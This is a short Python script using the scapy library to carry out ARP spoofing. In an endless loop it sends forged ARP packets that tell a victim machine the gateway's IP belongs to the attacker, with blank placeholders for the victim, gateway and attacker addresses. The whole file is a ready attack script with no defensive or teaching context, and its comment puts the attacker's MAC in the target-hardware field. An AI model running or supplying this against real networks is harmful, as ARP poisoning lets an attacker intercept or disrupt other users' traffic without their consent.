#coding: utf-8

from scapy.all import *
import time

op=1 # Op code 1 for ARP requests
victim= "" # Replace with Victim’s IP
spoof= "" # Replace with Gateway’s IP
mac= "" # Replace with Attacker’s Phys. Addr.

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
    send(arp)
    time.sleep(2)
